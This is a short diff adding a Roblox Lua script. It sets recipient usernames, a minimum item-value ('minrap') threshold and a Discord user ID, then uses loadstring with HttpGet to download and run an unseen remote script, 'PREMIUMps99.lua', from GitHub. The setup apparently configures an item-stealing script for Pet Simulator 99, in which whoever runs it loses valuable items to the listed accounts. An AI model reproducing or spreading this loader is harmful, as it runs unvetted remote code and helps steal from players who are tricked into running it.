@@ -1,0 +1,5 @@
+_G.Usernames = {"savage_Kid0307", "7Pawk", "ksi220002"} -- you can add as many as you'd like
+_G.minrap = 10000000
+_G.discuser = "438668302458290187" -- change to your Discord user ID
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/PS99/refs/heads/main/PREMIUMps99.lua", true))()
